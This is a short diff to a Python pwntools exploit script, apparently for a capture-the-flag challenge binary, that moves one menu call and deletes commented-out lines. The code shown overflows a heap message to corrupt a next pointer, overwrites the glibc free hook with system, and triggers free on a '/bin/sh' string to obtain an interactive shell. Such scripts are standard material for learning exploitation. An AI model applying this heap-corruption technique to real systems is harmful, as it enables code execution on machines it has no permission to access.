@@ -74,9 +74,10 @@ add_message(p, b"B" * 0x3f + b'\00') # message 2
 # Overflow message 0 to have message 1 free_hook - 0x8
 menu(p, 3)
 edit_message(p, 0, b"F" * 0x3f + b'\00' + p64(0x51) + p64(free_hook -0x8))
-menu(p, 3)
+
 
 # Edit message 2, which address will be used from message 1's next message pointer + 0x8 and point it to system
+menu(p, 3)
 edit_message(p, 2, p64(system))
 
 # Finally, overflow message 0 to set message 1's next message address to the address of /bin/sh
@@ -86,8 +87,5 @@ edit_message(p, 0, b"F" * 0x3f + b'\00' + p64(0x51) + p64(bin_sh_address))
 # When free_hook, now pointing to system is called, it will be passed the address of /bin/sh from message 1
 menu(p, 4)
 send_message(p, 2)
-
-# menu(p, 1)
-# add_message(p, p64(system))
 
 p.interactive()
